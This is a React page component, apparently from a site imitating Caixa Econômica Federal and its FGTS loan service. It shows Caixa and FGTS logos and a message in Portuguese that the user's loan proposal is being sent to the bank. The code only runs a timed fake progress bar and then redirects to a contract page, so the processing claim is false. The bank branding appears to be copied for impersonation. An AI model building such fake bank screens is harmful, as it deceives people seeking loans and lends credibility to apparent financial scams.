
import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Loader } from 'lucide-react';
import CaixaLogo from '@/components/CaixaLogo';
import FGTSLogo from '@/components/FGTSLogo';
import { useIsMobile } from '@/hooks/use-mobile';
import { Progress } from '@/components/ui/progress';

const LoanProcessing = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const isMobile = useIsMobile();
  const [progress, setProgress] = useState(0);
  
  // Get the selected bank data from location state
  const { bankLogo, bankName } = location.state || {
    bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png",
    bankName: "Caixa Econômica Federal"
  };

  useEffect(() => {
    // Start progress animation
    const timer = setInterval(() => {
      setProgress((oldProgress) => {
        const newProgress = oldProgress + 3;
        if (newProgress >= 100) {
          clearInterval(timer);
          // Navigate to the contract page after 3 seconds
          setTimeout(() => {
            navigate('/loan-contract', { 
              state: { bankLogo, bankName, ...location.state } 
            });
          }, 300);
          return 100;
        }
        return newProgress;
      });
    }, 80);

    return () => {
      clearInterval(timer);
    };
  }, [navigate, bankLogo, bankName, location.state]);

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
      {/* Header */}
      <div className="p-4 sm:p-6 flex justify-between items-center">
        <FGTSLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
        <CaixaLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
      </div>

      {/* Title */}
      <div className="p-4 sm:p-6">
        <div className="text-white text-2xl font-light">Empréstimo em Processamento</div>
        <div className="text-white opacity-60 text-sm mt-1">
          Estamos enviando sua proposta para o banco
        </div>
      </div>

      {/* Main content */}
      <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
        <div className="p-4 sm:p-6 flex flex-col items-center justify-center h-full">
          <div className="flex flex-col items-center justify-center space-y-8 max-w-md mx-auto">
            <div className="text-center mb-6">
              <h2 className="text-2xl font-semibold text-[#005CA9] mb-3">Enviando Proposta para o Banco</h2>
              <p className="text-gray-500">Por favor, aguarde enquanto processamos sua solicitação</p>
            </div>
            
            <div className="w-28 h-28 flex items-center justify-center mb-8">
              <img 
                src={bankLogo}
                alt={bankName}
                className="w-full h-full object-contain"
              />
            </div>
            
            <div className="w-full space-y-2">
              <Progress value={progress} className="h-2 w-full" />
              <div className="flex justify-between text-sm text-gray-500">
                <span>Processando...</span>
                <span>{progress}%</span>
              </div>
            </div>
            
            <div className="animate-pulse flex items-center justify-center mt-8">
              <Loader className="w-8 h-8 text-[#005CA9] animate-spin mr-2" />
              <span className="text-[#005CA9]">Aguarde um momento...</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoanProcessing;
